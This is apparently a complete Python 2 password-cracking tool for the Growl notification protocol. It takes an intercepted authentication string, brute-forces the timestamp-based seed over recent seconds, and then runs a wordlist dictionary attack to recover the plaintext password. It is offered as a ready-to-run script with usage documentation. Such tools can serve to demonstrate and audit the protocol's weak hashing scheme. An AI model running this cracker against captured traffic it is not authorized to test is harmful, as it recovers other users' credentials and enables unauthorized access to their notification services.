#!/usr/bin/env python
"""
Growl notification cracker by @ccneill

An example raw Growl identification string:
    MD5:B6D232AE0F195C407C2691FF426F2176.A41BADDE6D8BBDDC1FB0E8262D527517

Format:
    {ALGO}:{SECRET_HASH}.{SEED_HASH}

Usage:
    ./growl_crack.py --seed_hash=SEED_HASH --secret_hash=SECRET_HASH
        [--algo=ALGO --max_time=MAX_TIME --wordlist=WORDLIST]
    ./growl_crack.py --raw_string=RAW_STRING
        [--max_time=MAX_TIME --wordlist=WORDLIST]
    ./growl_crack.py --help

Options:
    --seed_hash=SEED_HASH      Seed hash (second part of raw string after ".")
    --secret_hash=SECRET_HASH  Secret hash (first part of raw string after ":")
    --algo=ALGO                Algorithm for hashing [default: MD5]
    --raw_string=RAW_STRING    Raw string, in format show above
    --max_time=MAX_TIME        Max time in seconds to go back for seed cracking
                               [default: 10000]
    --wordlist=WORDLIST        Wordlist to use for cracking password
                               [default: /usr/share/dict/words]
    --help                     Show help information
"""

import hashlib
import time
import sys
import re
import os.path

from docopt import docopt


def crack_seed(seed_hash, algo, max_time):
    current_time = time.time()
    print '[-] Starting seed cracking...'
    print '    Seed hash: {0}'.format(seed_hash)
    print '    Max time: {0}'.format(max_time)
    for i in xrange(0, max_time):
        guess_time = current_time - i
        guess_ctime = time.ctime(guess_time).encode('utf8')
        guess_hash = algo(guess_ctime)
        seed_hex_digest = guess_hash.hexdigest().upper()
        seed_raw_digest = guess_hash.digest()

        if seed_hex_digest == seed_hash:
            print '[+] SEED CRACKED'
            print '    Seed = "' + guess_ctime + '"\n'
            return seed_raw_digest

    return False


def crack_password(secret_hash, seed_digest, algo, wordlist):
    print '[-] Starting password cracking...'
    print '    Secret hash: {0}'.format(secret_hash)
    print '    Wordlist: {0}'.format(wordlist)
    words = ''
    try:
        with open(wordlist, 'r') as f:
            words = f.read()
    except IOError:
        print 'Could not read wordlist. Check file permissions'
        sys.exit(1)

    for word in words.split('\n'):
        try:
            word = word.encode('utf8')
        except UnicodeDecodeError:
            continue
        guess = word + seed_digest
        guess_key = algo(guess).digest()
        guess_key_hash = algo(guess_key).hexdigest().upper()

        if guess_key_hash == secret_hash:
            print '[+] PASSWORD CRACKED'
            print '    Password = "' + word + '"\n'
            return word

    return False


def main(args):
    algo_map = {
        'MD5': hashlib.md5,
        'SHA1': hashlib.sha1,
        'SHA256': hashlib.sha256,
        'SHA512': hashlib.sha512,
    }

    secret_hash = ''
    seed_hash = ''
    wordlist = args['--wordlist']
    if not os.path.isfile(wordlist):
        print '[!] Specified wordlist does not exist'
        sys.exit(1)

    if args['--algo'] in algo_map:
        algo = algo_map[args['--algo'].upper()]
    else:
        print '[!] Unknown algorithm specified'
        sys.exit(1)

    max_time = int(args['--max_time'])

    if args['--raw_string']:
        parts = re.findall(
            '([\w]+):([a-fA-F0-9]{32,256})\.([a-fA-F0-9]{32,256})',
            args['--raw_string']
        )
        if parts:
            parts = parts[0]
            algo = algo_map[parts[0].upper()]
            secret_hash = parts[1].upper()
            seed_hash = parts[2].upper()
        else:
            print '[!] Could not parse raw string'
            sys.exit(1)

    elif args['--secret_hash'] and args['--seed_hash']:
        secret_hash = args['--secret_hash'].upper()
        seed_hash = args['--seed_hash'].upper()

    else:
        print '[!] Unknown mode of operation'
        sys.exit(1)

    seed_digest = crack_seed(seed_hash, algo, max_time)
    if seed_digest:
        password = crack_password(secret_hash, seed_digest, algo, wordlist)
        if not password:
            print '[!] Password not found :('
    else:
        print '[!] Seed not found :('


if __name__ == '__main__':
    args = docopt(__doc__, version='0.1')
    main(args)
